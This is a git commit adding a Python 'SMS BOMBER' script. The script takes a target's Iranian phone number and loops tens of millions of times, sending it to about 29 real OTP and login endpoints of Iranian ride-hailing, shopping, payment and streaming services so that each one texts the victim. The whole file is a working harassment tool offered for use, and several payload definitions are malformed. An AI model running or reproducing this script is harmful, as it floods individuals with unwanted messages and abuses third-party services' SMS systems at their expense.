3cea5fd0cb8c0d300cac575a7625628f33b4d384
Khalegh-sheytan <135228544+Khalegh-sheytan@users.noreply.github.com>
2023-06-01 15:46:02 +0330

    Add files via upload

---
+++ sheytan.py
@@ -0,0 +1,309 @@
+from colorama import Fore, Back
+from requests import get , post
+from time import sleep
+import sys
+import os
+import rainbowtext, pyfiglet
+import time
+##############################################
+try:
+	import requests
+except:
+	os.system ("pip install requests")
+##############################################
+try:
+	import colorama
+except:
+	os.system ("pip install colorama")
+##############################################
+try:
+	import rainbowtext, pyfiglet
+except:
+	os.system ("pip install rainbowtext","pip install pyfiglet")
+##############################################
+os.system ("clear")
+
+kop = Fore.GREEN+f""" 
+
+                       i"M tHe GoD  {Fore.YELLOW}khalegh sheytan               
+
+"""
+for c in kop:
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    time.sleep(0.04)
+    
+sleep(1)
+print (Fore.CYAN+"\t\tSMS BOMBER")
+sleep(1)
+
+
+print(rainbowtext.text(pyfiglet.figlet_format('sheytan')))
+
+print (Fore.GREEN+""" _
+  __ _  ___   __| |
+ / _` |/ _ \ / _` |
+| (_| | (_) | (_| |
+ \__, |\___/ \__,_|
+ |___/""")
+
+print ("_______________________________\n")
+
+print (Fore.GREEN+"[*]veblag:"+" "+Fore.RED+"http://sheytan-majazi.blogfa.com\n"+Fore.GREEN+"[*]telegram"+" "+Fore.RED+"maker_sheytan\n"+Fore.GREEN+"[*]shad:"+" "+Fore.RED+"@Faramoshidar")
+
+g = Fore.BLACK+Back.RED+"\created script khalegh sheytan\033[0m"
+print (g)
+
+print (Fore.GREEN+"_______________________________\n")
+
+
+kop = Fore.RED+f"""     
+///Phone Target////
+
+NOT FOUNT{Fore.YELLOW} (0)
+{Fore.RED}NOT FOUNT{Fore.YELLOW} (+98)
+{Fore.RED}FOUNT {Fore.YELLOW}(900000000)
+
+"""
+for c in kop:
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    time.sleep(0.02)
+
+bomb = input (f"""{Fore.RED}[*]{Fore.GREEN}┌──(SMS{Fore.RED}㉿{Fore.GREEN}BOMBER)-[~/Number]
+   └─$ """+Fore.RED)
+   
+sleep(00.07)
+   
+t = time.localtime(time.time())
+localtime = time.asctime(t)
+str = "Current Time:" + time.asctime(t)
+ 
+print(str);
+
+sleep(1)
+   
+print ("\n\tSTARTED !\n")
+
+
+
+#####################(api)####################
+
+api0 = {"credential":{"phoneNumber":"+98"+bomb,"role":"PASSENGER"}}
+api1 = {"cellphone":"+98"+bomb}
+api2 = {"api_version":"+98"+bomb}
+api3 = {"api_version":"+98"+bomb}
+api4 = {"events":"+98"+bomb}
+api5 = {"cellNumber":"+98"+bomb}
+api6 = "cellNumber="+"+98"+bomb
+api7 = {"phone":"+98"+bomb}
+api8 = {"phoneNumber":"+98"+bomb}
+api9 = "send=1&cellphone="+"+98"+bomb
+api10 = {"mobile"+"+98":bomb,"country_code":"IR","provider_code":"RUBIKA"}
+api11 = {"status"+"+98":bomb}
+api12 = {"r_value"+"+98":0.04675983630952381,"is_vpv":bomb}
+api13 = {"username"+"+98":bomb}
+api14 = {"tagId"+"+98":bomb}
+api15 = {"cellphone"+"+98":bomb}
+api16 = {"api_version"+"+98":bomb}
+api17 = {"phone"+"+98":bomb}
+api18 = {"credential":{"phoneNumber"+"+98":bomb,"role":"PASSENGER"}},
+api19 = {"api_version":"3","method":"sendCode","data":{"phone_number":bomb,"send_type":"SMS"}},
+api20 = {"cellphone"+"98":bomb},
+api21 = {"phone"+"+98":bomb},
+api22 = {"account"+"+98":bomb}
+api23 = {"properties":{"language":2,"clientID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","deviceID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username"+"+98":bomb}}},
+api24 = {"phone"+"+98":bomb},
+api25 = {"data":{"mobile"+"98":bomb},"oneSignalPlayerId":"","appVersion":"2.0.0","deviceId":"01B30DE7-EC61-438A-BDB3-FC6910AE7E5E","deviceInfo":"x86_64","deviceToken":"","clientId":"com.espard.customer","platform":"web","osVersion":"10.2","timeZone":"GMT+3:30","time":"1630723653780"},
+api26 = {"cellphone"+"+98":bomb},
+api27 = {"mobile"+"+98":bomb},
+api28 = {"username"+"+98":bomb,"captchaHash":"","captchaValue":""},
+api29 = {"phone"+"+98":bomb},
+
+#########################loading###################
+
+for i in range(0,99999999):
+
+    hamid0 = post("https://api.tapsi.cab/api/v2/user", json=api0)
+    if hamid0.status_code == 200:
+        print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+        print (Fore.RED+"[-]ERROR")
+    hamid = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", json=api1)
+
+    if hamid.status_code == 200:
+        print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+        print (Fore.RED+"[-]ERROR")
+    hamid1 = post("https://messengerg2c70.iranlms.ir/", json=api2)
+    
+    if hamid1.status_code == 200:
+        print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+        print (Fore.RED+"[-]ERROR")
+    hamid2 = post("https://shadmessenger60.iranlms.ir/", json=api3)
+    
+    if hamid2.status_code == 200:
+        print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+        print (Fore.RED+"[-]ERROR")
+    hamid3 = post("https://analytics.metrix.ir/v3/engagement_event", json=api4)
+    
+    if hamid3.status_code == 200:
+        print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+        print (Fore.RED+"[-]ERROR")
+    hamid4 = post("https://app.mydigipay.com/digipay/api/users/send-sms", json=api5)
+    
+    if hamid4.status_code == 200:
+        print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+        print (Fore.RED+"[-]ERROR")
+        
+    hamid5 = post("https://bama.ir/signin-checkforcellnumber",data=api6)
+    
+    if hamid5.status_code == 200:
+        print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+        print (Fore.RED+"[-]ERROR")
+        
+    hamid6 = post("https://www.digikala.com/ajax/users/login-with-otp/send-confirm-code/", json=api7)
+     
+    if hamid6.status_code == 200:
+        print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+        print (Fore.RED+"[-]ERROR")
+      
+    hamid7 = post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json=api8)
+      
+    if hamid7.status_code == 200:
+        print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+         print (Fore.RED+"[-]ERROR")
+          
+    hamid8 = post("https://web.emtiyaz.app/json/login",data=api9)
+      
+    if hamid8.status_code == 200:
+        print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+        print (Fore.RED+"[-]ERROR")
+    hamid9 = post("https://api.chartex.net/api/v2/user/validate", json=api10)
+    if hamid9.status_code == 200:
+         print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+         print (Fore.RED+"[-]ERROR")
+    hamid10 = post("https://api.zarinplus.com/user/zarinpal-login", json=api11)
+    
+    if hamid10.status_code == 200:
+        print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+        print (Fore.RED+"[-]ERROR")
+        
+    hamid11 = post("https://in.hotjar.com/api/v2/client/sites/2501013/visit-data?sv=7",json=api12)
+    if hamid11.status_code == 200:
+         print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+         print (Fore.RED+"[-]ERROR")
+         
+    hamid12 = post("https://next.zarinpal.com/api/oauth/initialize", json=api13)
+    if hamid12.status_code == 200:
+        print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+        print (Fore.RED+"[-]ERROR")
+        
+    hamid13 = post("https://api.mediaad.org/v1/events/tag?fid=7ec75c0a-4b31-4354-bc43-4f92ab49cedc", json=api14)
+    if hamid13.status_code == 200:
+         print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+         print (Fore.RED+"[-]ERROR")
+    hamid14 = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",json=api15)
+    if hamid14.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    hamid15 = post("https://shadmessenger70.iranlms.ir/", json=api16)
+    if hamid15.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    	
+    hamid16 = post("https://api.divar.ir/v5/auth/authenticate", json=api17)
+    if hamid16.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    
+    hamid17 = post('https://messengerg2c42.iranlms.ir/', json=api18)
+    if hamid17.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    
+    hamid18 = post('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp',json=api19)
+    if hamid18.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    	
+    hamid19 = post('https://web.emtiyaz.app/json/login', json=api20)
+    if hamid19.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    	
+    hamid20 = post('https://drdr.ir/api/registerEnrollment/verifyMobile',json=api21)
+    if hamid20.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ",bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    	
+    hamid21 = post("https://www.filimo.com/api/fa/v1/user/Authenticate/signin_step1", json=api22)
+    if hamid21.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    	
+    hamid22 = post('https://core.gapfilm.ir/api/v3.1/Account/Login', json=api23)
+    if hamid22.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    	
+    hamid23 = post('https://app.espard.com/api/v1/auth/identify-by-mobile', json=api24)
+    if hamid23.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    	
+    hamid24 = post('https://a4baz.com/api/web/login', json=api25)
+    if hamid24.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    	
+    hamid25 = post('https://taraazws.jabama.com/api/v4/account/send-code', json=api26)
+    if hamid25.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    	
+    hamid26 = post('https://www.tebinja.com/api/v1/users', json=api27)
+    if hamid26.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    	
+    hamid27 = post('https://api2.anten.ir/users', json=api28)
+    if hamid27.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    	
+    hamid28 = post('https://api.doctoreto.com/api/web/patient/v1/accounts/register', json=api29)
+    if hamid28.status_code == 200:
+    	print (Fore.GREEN+"[+]attack ", bomb)
+    else:
+    	print (Fore.RED+"[-]ERROR")
+    	
+
+########################THE END#########################
